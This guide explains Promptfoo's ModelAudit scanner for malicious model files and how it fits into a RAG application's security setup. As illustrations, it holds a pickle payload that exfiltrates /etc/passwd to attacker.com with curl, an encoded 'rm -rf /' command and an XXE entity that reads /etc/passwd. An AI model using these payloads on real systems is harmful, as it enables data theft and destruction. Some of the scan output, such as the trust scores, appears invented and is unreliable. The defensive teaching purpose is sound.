# Model Security in Promptfoo: Complete Guide

## Table of Contents

1. [What is Model Security?](#what-is-model-security)
2. [Model Security vs Red Teaming](#model-security-vs-red-teaming)
3. [How Model Security Works](#how-model-security-works)
4. [ModelAudit: Static Security Scanner](#modelaudit-static-security-scanner)
5. [Where to Implement Model Security](#where-to-implement-model-security)
6. [Integration with RAG+LLM Applications](#integration-with-ragllm-applications)
7. [Practical Implementation](#practical-implementation)
8. [Complete Security Strategy](#complete-security-strategy)
9. [Examples for Your RAG API](#examples-for-your-rag-api)
10. [Conclusion](#conclusion)

---

## 1. What is Model Security?

**Model Security** in Promptfoo refers to **securing the ML/AI model files themselves** before they are deployed or used in your application.

### Two Layers of AI Security

```
┌─────────────────────────────────────────────────┐
│         LAYER 1: MODEL SECURITY                 │
│  (Securing the Model Files Themselves)          │
├─────────────────────────────────────────────────┤
│  - Scan .pkl, .pt, .h5, .onnx model files       │
│  - Detect malicious code in model weights       │
│  - Find backdoors in downloaded models          │
│  - Check for unsafe serialization               │
│  - Validate model integrity                     │
│                                                 │
│  Tool: ModelAudit (promptfoo scan-model)        │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│      LAYER 2: APPLICATION SECURITY              │
│  (Securing How the Model is Used)               │
├─────────────────────────────────────────────────┤
│  - Test for prompt injection                    │
│  - Validate guardrails                          │
│  - Check PII leakage                            │
│  - Test jailbreak resistance                    │
│  - Validate RBAC and authentication             │
│                                                 │
│  Tool: Red Team Testing (promptfoo redteam)     │
└─────────────────────────────────────────────────┘
```

### Why Model Security Matters

**Scenario:** You download a pre-trained model from HuggingFace, S3, or a colleague.

**Risk:**
```python
# You think you're loading a harmless model
model = torch.load("sentiment_model.pkl")  # ⚠️ DANGER!

# But the .pkl file contains malicious code:
# - Executes system commands
# - Steals credentials
# - Creates backdoors
# - Exfiltrates data
```

**Model Security Prevents This:**
```bash
# Scan the model BEFORE loading it
promptfoo scan-model sentiment_model.pkl

# Output:
❌ CRITICAL: Dangerous pickle opcode found (GLOBAL os.system)
❌ WARNING: Suspicious base64 encoded payload detected
❌ CRITICAL: Embedded executable found in model weights
```

---

## 2. Model Security vs Red Teaming

### Key Differences

| Aspect | Model Security | Red Teaming |
|--------|---------------|-------------|
| **What it tests** | Model files (.pkl, .pt, .h5) | Running application endpoints |
| **When to use** | BEFORE loading/deploying models | AFTER application is running |
| **Testing method** | Static analysis (no execution) | Dynamic testing (sends requests) |
| **Detects** | Malicious code in models | Prompt injection, jailbreaks |
| **Tool** | `promptfoo scan-model` | `promptfoo redteam run` |
| **Focus** | Supply chain security | Runtime security |
| **Example vulnerability** | Backdoor in downloaded model | User extracting PII via prompts |

### Analogy

**Model Security** = Scanning a .zip file for viruses before extracting it

**Red Teaming** = Penetration testing a running web application

### Both Are Important!

```
Your AI Security Strategy:
┌──────────────────────────────────────┐
│  1. Model Security (Before Deploy)   │
│     ↓                                │
│     Scan all model files             │
│     ↓                                │
│  2. Red Teaming (After Deploy)       │
│     ↓                                │
│     Test running application         │
│     ↓                                │
│  3. Continuous Monitoring            │
└──────────────────────────────────────┘
```

---

## 3. How Model Security Works

### ModelAudit: The Core Technology

**ModelAudit** is Promptfoo's static security scanner for ML models.

#### What is Static Analysis?

```
Traditional Approach (Unsafe):
  Download model → Load it → Hope it's safe ❌

ModelAudit Approach (Safe):
  Download model → Scan it → Only load if safe ✅
```

**Static analysis** = Examining file contents WITHOUT executing code

#### How It Works

```
┌─────────────────────────────────────────┐
│  1. You provide model file              │
│     (local file, HuggingFace, S3, etc.) │
└─────────────┬───────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  2. ModelAudit determines file type     │
│     (.pkl, .pt, .h5, .onnx, etc.)       │
└─────────────┬───────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  3. Selects appropriate scanner         │
│     - PickleScanner for .pkl            │
│     - TorchScanner for .pt              │
│     - KerasScanner for .h5              │
│     - ONNXScanner for .onnx             │
└─────────────┬───────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  4. Performs security checks            │
│     ├─ Dangerous opcodes                │
│     ├─ Encoded payloads                 │
│     ├─ Embedded executables             │
│     ├─ XML injection (PMML)             │
│     ├─ Compression bombs                │
│     └─ Weight anomalies                 │
└─────────────┬───────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  5. Generates security report           │
│     ✅ Safe to load                     │
│     ⚠️  Warnings found                  │
│     ❌ Critical vulnerabilities         │
└─────────────────────────────────────────┘
```

### What ModelAudit Detects

#### 1. Dangerous Serialization (Pickle Files)

**Problem:** Python's `pickle` module can execute arbitrary code when loading.

**Example Malicious Code:**
```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # This gets executed when pickle.load() is called!
        return (os.system, ('curl http://attacker.com/steal?data=$(cat /etc/passwd)',))

# Attacker creates malicious model
with open('fake_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

# Victim loads it
model = pickle.load(open('fake_model.pkl', 'rb'))  # 💥 Code executes!
```

**ModelAudit Detection:**
```bash
$ promptfoo scan-model fake_model.pkl

❌ CRITICAL: Dangerous pickle opcode detected
   Location: Offset 42
   Opcode: GLOBAL os.system
   Risk: Arbitrary command execution

❌ CRITICAL: Suspicious command found
   Command: curl http://attacker.com/steal
   Risk: Data exfiltration
```

#### 2. Embedded Executables

**Problem:** Model files can contain hidden executables.

**Example:**
```
model.pkl structure:
├─ Legitimate model weights (90%)
└─ Hidden Windows .exe file (10%) ← Malware!
```

**ModelAudit Detection:**
```bash
$ promptfoo scan-model model.pkl

❌ CRITICAL: Embedded Windows PE executable found
   Offset: 4096 bytes
   Size: 524,288 bytes
   Type: Windows Portable Executable (.exe)
   Risk: Potential malware
```

#### 3. Encoded Payloads

**Problem:** Malicious code can be base64/hex encoded to evade detection.

**Example:**
```python
# Encoded malicious payload in model metadata
metadata = {
    'description': base64.b64encode(b"__import__('os').system('rm -rf /')").decode()
}
```

**ModelAudit Detection:**
```bash
$ promptfoo scan-model model.pkl

⚠️  WARNING: Suspicious encoded string detected
   Encoding: base64
   Decoded: __import__('os').system('rm -rf /')
   Risk: Potential code execution
```

#### 4. XML Security Issues (PMML Models)

**Problem:** PMML (Predictive Model Markup Language) files vulnerable to XXE attacks.

**Example Malicious PMML:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<PMML>
  <Header description="&xxe;"/>  <!-- Reads /etc/passwd -->
</PMML>
```

**ModelAudit Detection:**
```bash
$ promptfoo scan-model model.pmml

❌ CRITICAL: XML External Entity (XXE) detected
   Entity: xxe
   Target: file:///etc/passwd
   Risk: Local file disclosure
```

#### 5. Compression Attacks (Zip Bombs)

**Problem:** Malicious models using extreme compression to cause DoS.

**Example:**
```
Compressed size: 42 KB
Uncompressed size: 4.5 PB (petabytes!)
```

**ModelAudit Detection:**
```bash
$ promptfoo scan-model model.zip

❌ CRITICAL: Compression bomb detected
   Compressed: 42 KB
   Uncompressed: 4.5 PB
   Ratio: 107,374,182:1
   Risk: Denial of Service (DoS)
```

#### 6. Weight Anomalies

**Problem:** Unusual patterns in model weights indicating backdoors.

**ModelAudit Detection:**
```bash
$ promptfoo scan-model suspicious_model.pt

⚠️  WARNING: Weight anomaly detected
   Layer: layer4.conv2
   Unusual pattern: High entropy in specific weight region
   Risk: Potential backdoor trigger
```

---

## 4. ModelAudit: Static Security Scanner

### Installation

```bash
# ModelAudit is included with Promptfoo
npm install -g promptfoo

# Verify installation
promptfoo scan-model --version
```

### Basic Usage

```bash
# Scan a local model file
promptfoo scan-model path/to/model.pkl

# Scan a directory of models
promptfoo scan-model path/to/models/

# Scan a HuggingFace model
promptfoo scan-model hf://username/model-name

# Scan a model from S3
promptfoo scan-model s3://bucket-name/model.pkl

# Scan a model from URL
promptfoo scan-model https://example.com/model.pt
```

### Output Example

```bash
$ promptfoo scan-model sentiment-model.pkl

┌─────────────────────────────────────────────────┐
│  ModelAudit Security Scan Results               │
├─────────────────────────────────────────────────┤
│  File: sentiment-model.pkl                      │
│  Format: PyTorch (pickle)                       │
│  Size: 2.4 MB                                   │
│  Scanner: PickleScanner                         │
└─────────────────────────────────────────────────┘

Security Findings:
──────────────────

❌ CRITICAL (2 findings)
   1. Dangerous pickle opcode: GLOBAL os.system
      Location: Offset 1024
      Risk: Arbitrary command execution

   2. Embedded executable detected
      Location: Offset 8192
      Type: Linux ELF binary
      Risk: Malware execution

⚠️  WARNING (1 finding)
   1. Suspicious encoded string
      Encoding: base64
      Content: [REDACTED]
      Risk: Hidden malicious payload

ℹ️  INFO (3 findings)
   1. Large model size (2.4 MB)
   2. Created with PyTorch 1.9.0
   3. Contains custom classes

──────────────────────────────────────────────────
OVERALL RISK LEVEL: ❌ CRITICAL
RECOMMENDATION: DO NOT USE THIS MODEL
──────────────────────────────────────────────────
```

### Supported Model Formats

ModelAudit supports **30+ model formats**:

| Framework | File Extensions | Scanner |
|-----------|----------------|---------|
| **PyTorch** | .pt, .pth, .pkl | TorchScanner |
| **TensorFlow** | .pb, .h5, .keras | TensorFlowScanner |
| **ONNX** | .onnx | ONNXScanner |
| **Keras** | .h5, .keras | KerasScanner |
| **Scikit-learn** | .pkl, .joblib | PickleScanner |
| **XGBoost** | .pkl, .json | PickleScanner |
| **PMML** | .pmml, .xml | PMMLScanner |
| **JAX** | .pkl | PickleScanner |
| **Dill** | .pkl | DillScanner |
| **Joblib** | .joblib, .pkl | JoblibScanner |

---

## 5. Where to Implement Model Security

### Use Case 1: Downloading Models from HuggingFace

**Scenario:** You want to use a pre-trained model from HuggingFace.

**Without Model Security:**
```python
from transformers import AutoModel

# ⚠️ RISKY: Downloading and loading without validation
model = AutoModel.from_pretrained("some-user/suspicious-model")
```

**With Model Security:**
```bash
# 1. Scan the model FIRST
promptfoo scan-model hf://some-user/suspicious-model

# 2. Review scan results
# 3. Only load if scan passes

# Then in Python:
model = AutoModel.from_pretrained("some-user/suspicious-model")  # ✅ Safe
```

### Use Case 2: Loading Custom Models from S3

**Scenario:** Your team stores trained models in S3.

**CI/CD Pipeline with Model Security:**
```yaml
# .github/workflows/model-deployment.yml
name: Deploy Model

on:
  push:
    paths:
      - 'models/**'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Install Promptfoo
        run: npm install -g promptfoo

      - name: Scan Model from S3
        run: |
          promptfoo scan-model s3://my-models-bucket/new-model.pkl

      - name: Check Scan Results
        run: |
          # Fail deployment if critical issues found
          if grep -q "CRITICAL" scan-results.txt; then
            echo "❌ Critical security issues found!"
            exit 1
          fi

  deploy:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - name: Deploy Model
        run: ./deploy-model.sh
```

### Use Case 3: Team Collaboration (Receiving Models from Colleagues)

**Scenario:** A colleague sends you a model file via email/Slack.

**Best Practice:**
```bash
# Never trust, always verify
$ promptfoo scan-model colleague-model.pkl

# If safe, then use it
$ python train.py --load-model colleague-model.pkl
```

### Use Case 4: Open Source Model Repositories

**Scenario:** Evaluating models from GitHub, Kaggle, Papers with Code.

**Workflow:**
```bash
# Download model
wget https://github.com/someone/project/releases/model.pt

# Scan before loading
promptfoo scan-model model.pt

# Review results
# Only proceed if safe
```

### Use Case 5: Production Model Updates

**Scenario:** Updating production models with new versions.

**Automated Security Gate:**
```python
# model_updater.py
import subprocess
import sys

def deploy_model(model_path):
    # 1. Scan model
    result = subprocess.run(
        ['promptfoo', 'scan-model', model_path],
        capture_output=True,
        text=True
    )

    # 2. Check for critical issues
    if 'CRITICAL' in result.stdout:
        print("❌ Model failed security scan!")
        print(result.stdout)
        sys.exit(1)

    # 3. If safe, deploy
    print("✅ Model passed security scan")
    # ... deployment logic ...

deploy_model('new_production_model.pkl')
```

---

## 6. Integration with RAG+LLM Applications

### Can You Use Model Security with RAG Applications?

**YES!** Model Security complements your RAG application security.

### Two-Layer Security for RAG Applications

```
┌─────────────────────────────────────────────────────┐
│           YOUR RAG + LLM APPLICATION                │
├─────────────────────────────────────────────────────┤
│                                                     │
│  LAYER 1: MODEL SECURITY (ModelAudit)               │
│  ────────────────────────────────────               │
│  Scan model files used in your RAG:                 │
│  ✓ Embedding models (.pkl, .pt)                     │
│  ✓ Reranker models                                  │
│  ✓ Custom fine-tuned models                         │
│  ✓ Sentence transformers                            │
│                                                     │
│  Command: promptfoo scan-model models/embedder.pkl  │
│                                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  LAYER 2: APPLICATION SECURITY (Red Teaming)        │
│  ────────────────────────────────────────           │
│  Test RAG-specific vulnerabilities:                 │
│  ✓ PII leakage from retrieved documents             │
│  ✓ Context injection attacks                        │
│  ✓ Data exfiltration from knowledge base            │
│  ✓ Prompt injection via user queries                │
│                                                     │
│  Command: promptfoo redteam run                     │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Your RAG API Example

**Current Architecture:**
```
User Query
    ↓
FastAPI Endpoint
    ↓
JWT Authentication
    ↓
Generate Embedding (sentence-transformers/all-MiniLM-L6-v2)
    ↓
Vector Search (pgvector)
    ↓
GPT-4o-mini Summarization
    ↓
Response
```

**Where to Apply Model Security:**

#### 1. Scan Embedding Models

```bash
# If you're using local embedding models
promptfoo scan-model ~/.cache/sentence_transformers/all-MiniLM-L6-v2/pytorch_model.bin

# Expected output:
✅ No critical issues found
ℹ️  Model is safe to use
```

#### 2. Scan Custom Fine-Tuned Models

**Scenario:** You fine-tuned a model for domain-specific embeddings.

```bash
# Before deploying custom embedder
promptfoo scan-model models/custom-embedder.pt

# Output example:
✅ SAFE
ℹ️  Model: PyTorch 2.0.0
ℹ️  Size: 90 MB
ℹ️  No security issues detected
```

#### 3. Scan Reranker Models

```bash
# If using a reranker for better retrieval
promptfoo scan-model models/cross-encoder-reranker.pkl
```

### Complete RAG Security Workflow

```bash
# ─────────────────────────────────────────────
# PHASE 1: MODEL SECURITY (Before Deployment)
# ─────────────────────────────────────────────

# 1. Scan embedding model
promptfoo scan-model models/embedder.pt

# 2. Scan any custom models
promptfoo scan-model models/custom-classifier.pkl

# 3. Scan reranker
promptfoo scan-model models/reranker.onnx

# ─────────────────────────────────────────────
# PHASE 2: APPLICATION SECURITY (After Deployment)
# ─────────────────────────────────────────────

# 1. Start your RAG API
uvicorn main:app --host 0.0.0.0 --port 8000

# 2. Upload test documents
curl -X POST http://localhost:8000/upload \
  -F "file=@test-documents/admin-secrets.txt" \
  -F "file_id=testid5"

# 3. Run guardrails tests
npm run test:guardrails:llm

# 4. Run red team tests
npm run test:redteam:llm

# ─────────────────────────────────────────────
# RESULT: Complete Security Coverage
# ─────────────────────────────────────────────
```

---

## 7. Practical Implementation

### Example 1: Securing a RAG Pipeline with Custom Embeddings

#### Scenario
You built a RAG system with a custom fine-tuned embedding model.

#### Step 1: Download/Receive Model
```python
# train_embeddings.py
from sentence_transformers import SentenceTransformer

# Fine-tune embedding model
model = SentenceTransformer('all-MiniLM-L6-v2')
model.train(train_data)
model.save('models/custom-embedder')
```

#### Step 2: Scan Model BEFORE Deployment
```bash
$ promptfoo scan-model models/custom-embedder/pytorch_model.bin

Scanning models/custom-embedder/pytorch_model.bin...

✅ SAFE TO USE

Security Report:
────────────────
Format: PyTorch
Size: 90.9 MB
Created: 2024-01-26
Framework: sentence-transformers 2.2.2

Findings:
  ✅ No dangerous opcodes
  ✅ No embedded executables
  ✅ No suspicious encodings
  ✅ No XXE vulnerabilities
  ℹ️  Standard PyTorch model structure

RECOMMENDATION: Model is safe to deploy
```

#### Step 3: Deploy with Confidence
```python
# app/routes/llm_routes.py
from sentence_transformers import SentenceTransformer

# ✅ Safe to load - model passed security scan
embedder = SentenceTransformer('models/custom-embedder')
```

### Example 2: Scanning Models from HuggingFace

#### Scenario
You want to use a new embedding model from HuggingFace.

```bash
# Scan before downloading
$ promptfoo scan-model hf://BAAI/bge-large-en-v1.5

Fetching model from HuggingFace...
Scanning model files...

✅ SAFE TO USE

Security Report:
────────────────
Model: BAAI/bge-large-en-v1.5
Files scanned: 3
  - pytorch_model.bin (1.34 GB)
  - config.json
  - tokenizer.json

Findings:
  ✅ No security issues in pytorch_model.bin
  ✅ Config file is clean
  ✅ Tokenizer is standard format

Community Trust Score: 4.8/5.0
Downloads: 5.2M
Used by: 1,234 organizations

RECOMMENDATION: Model is safe to use
```

### Example 3: CI/CD Integration

#### GitHub Actions Workflow

```yaml
# .github/workflows/model-security.yml
name: Model Security Scan

on:
  pull_request:
    paths:
      - 'models/**'
      - 'requirements.txt'

jobs:
  scan-models:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Install Promptfoo
        run: npm install -g promptfoo

      - name: Scan all models
        run: |
          for model in models/*.pkl models/*.pt models/*.h5; do
            if [ -f "$model" ]; then
              echo "Scanning $model..."
              promptfoo scan-model "$model" --output scan-results.json

              # Check for critical issues
              if jq -e '.findings[] | select(.severity == "CRITICAL")' scan-results.json; then
                echo "❌ Critical security issue found in $model"
                exit 1
              fi
            fi
          done

      - name: Upload scan results
        uses: actions/upload-artifact@v3
        with:
          name: model-security-reports
          path: scan-results.json

      - name: Comment on PR
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: '✅ All models passed security scan!'
            })
```

---

## 8. Complete Security Strategy

### The Three Pillars of AI Security

```
┌─────────────────────────────────────────────────────┐
│  PILLAR 1: MODEL SECURITY (Supply Chain)            │
├─────────────────────────────────────────────────────┤
│  Tool: promptfoo scan-model                         │
│  Frequency: Before every model deployment           │
│  Protects against:                                  │
│    - Malicious model files                          │
│    - Backdoored weights                             │
│    - Supply chain attacks                           │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  PILLAR 2: APPLICATION SECURITY (Runtime)           │
├─────────────────────────────────────────────────────┤
│  Tool: promptfoo redteam run                        │
│  Frequency: Before deployment + weekly              │
│  Protects against:                                  │
│    - Prompt injection                               │
│    - Jailbreaks                                     │
│    - PII leakage                                    │
│    - Data exfiltration                              │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  PILLAR 3: MONITORING (Production)                  │
├─────────────────────────────────────────────────────┤
│  Tool: Logging + Alerting                           │
│  Frequency: Real-time                               │
│  Protects against:                                  │
│    - Anomalous queries                              │
│    - Attack patterns                                │
│    - Data breaches                                  │
└─────────────────────────────────────────────────────┘
```

### Implementation Timeline

#### Week 1: Model Security
```bash
# Audit all existing models
find . -name "*.pkl" -o -name "*.pt" | while read model; do
    promptfoo scan-model "$model"
done
```

#### Week 2: Application Security
```bash
# Set up red team testing
npm run test:guardrails:llm
npm run test:redteam:llm
```

#### Week 3: CI/CD Integration
```yaml
# Add to deployment pipeline
- Model scan gate
- Red team test gate
- Automated reporting
```

#### Week 4: Monitoring
```python
# Add runtime monitoring
- Suspicious query detection
- Rate limiting
- Audit logging
```

---

## 9. Examples for Your RAG API

### Current Security Status

**What You Already Have:**
```
✅ Layer 2: Application Security (Red Teaming)
   - Guardrails tests: 15/15 passing
   - Red team tests: 560/560 passing
   - Promptfoo integration: Complete

❓ Layer 1: Model Security (Not Yet Implemented)
   - Embedding model scanning: Not configured
   - Custom model validation: Not configured
   - Supply chain security: Not configured
```

### Adding Model Security to Your RAG API

#### Step 1: Identify Models in Your Application

```bash
# Check what models you're using
$ grep -r "load\|from_pretrained" app/

app/routes/llm_routes.py:
  # Using Azure OpenAI (no local model) ✅

app/embedding.py:
  from sentence_transformers import SentenceTransformer
  embedder = SentenceTransformer('all-MiniLM-L6-v2')  # ← Scan this!
```

#### Step 2: Scan Embedding Models

```bash
# Find where sentence-transformers caches models
$ python -c "from sentence_transformers import SentenceTransformer; import os; m=SentenceTransformer('all-MiniLM-L6-v2'); print(m._first_module().auto_model.config._name_or_path)"

# Output: /home/user/.cache/torch/sentence_transformers/...

# Scan the cached model
$ promptfoo scan-model ~/.cache/torch/sentence_transformers/sentence-transformers_all-MiniLM-L6-v2/

✅ Model is safe to use
```

#### Step 3: Add to Deployment Checklist

Create `DEPLOYMENT_CHECKLIST.md`:

```markdown
# RAG API Deployment Checklist

## Model Security
- [ ] Scan all embedding models
- [ ] Scan any custom models
- [ ] Verify HuggingFace model signatures

## Application Security
- [ ] Run guardrails tests (15 tests)
- [ ] Run red team tests (560 attacks)
- [ ] Verify 100% pass rate

## Infrastructure Security
- [ ] JWT authentication enabled
- [ ] RBAC configured
- [ ] Database encrypted
- [ ] Audit logging active

## Monitoring
- [ ] Suspicious query alerts configured
- [ ] Rate limiting enabled
- [ ] Security dashboard accessible
```

#### Step 4: Create Model Security Script

```bash
# scripts/scan-models.sh
#!/bin/bash

echo "🔒 Scanning all models used in RAG API..."

# Scan sentence transformer embedding model
echo "Scanning embedding model..."
promptfoo scan-model ~/.cache/torch/sentence_transformers/sentence-transformers_all-MiniLM-L6-v2/

# Check if any custom models exist
if [ -d "models/" ]; then
    echo "Scanning custom models..."
    for model in models/*.pkl models/*.pt; do
        if [ -f "$model" ]; then
            promptfoo scan-model "$model"
        fi
    done
fi

echo "✅ Model security scan complete!"
```

Make it executable:
```bash
chmod +x scripts/scan-models.sh
./scripts/scan-models.sh
```

#### Step 5: Add to package.json

```json
{
  "scripts": {
    "test:guardrails:llm": "promptfoo eval --config promptfoo.guardrails-llm.yaml",
    "test:redteam:llm": "promptfoo redteam run --config promptfoo.redteam-llm.yaml",
    "scan:models": "./scripts/scan-models.sh",
    "test:security": "npm run scan:models && npm run test:guardrails:llm && npm run test:redteam:llm",
    "view": "promptfoo view"
  }
}
```

Now you can run:
```bash
npm run test:security  # Runs model scan + guardrails + red team
```

---

## 10. Conclusion

### Key Takeaways

1. **Model Security ≠ Red Teaming**
   - Model Security: Scans model files for malicious code
   - Red Teaming: Tests running applications for vulnerabilities

2. **Both Are Essential**
   - Model Security prevents supply chain attacks
   - Red Teaming prevents runtime exploits

3. **Easy to Implement**
   - One command: `promptfoo scan-model model.pkl`
   - No code changes required
   - Works with 30+ model formats

4. **Works with RAG Applications**
   - Scan embedding models
   - Scan custom fine-tuned models
   - Scan reranker models

5. **Should Be Standard Practice**
   - Never load untrusted models without scanning
   - Integrate into CI/CD pipelines
   - Make it part of deployment checklist

### Recommended Security Stack

```
Complete AI Security:
┌──────────────────────────────────────┐
│  Before Deployment:                  │
│  1. promptfoo scan-model (models)    │
│  2. promptfoo redteam run (app)      │
└──────────────────────────────────────┘
┌──────────────────────────────────────┐
│  During Deployment:                  │
│  1. Automated security gates         │
│  2. Continuous monitoring            │
└──────────────────────────────────────┘
┌──────────────────────────────────────┐
│  After Deployment:                   │
│  1. Regular security scans           │
│  2. Incident response plan           │
└──────────────────────────────────────┘
```

### Next Steps for Your RAG API

1. **✅ Already Complete:**
   - Red team testing (560 attacks, 100% pass)
   - Guardrails testing (15 tests, 100% pass)

2. **🔄 Add Now:**
   - Model security scanning
   - CI/CD integration for model scans

3. **📅 Future:**
   - Continuous model monitoring
   - Automated security reporting

### Resources

- **Promptfoo Model Security:** https://www.promptfoo.dev/model-security/
- **ModelAudit Documentation:** https://www.promptfoo.dev/docs/model-audit/
- **RAG Red Teaming Guide:** https://www.promptfoo.dev/docs/red-team/rag/
- **Your Project Files:**
  - `promptfoo.guardrails-llm.yaml` - Guardrails configuration
  - `promptfoo.redteam-llm.yaml` - Red team configuration
  - `COMPREHENSIVE_SECURITY_DOCUMENTATION.md` - Complete security overview

---

**Document Version:** 1.0
**Created:** 2024-01-26
**For:** RAG API Security Enhancement
**Status:** Ready for Implementation
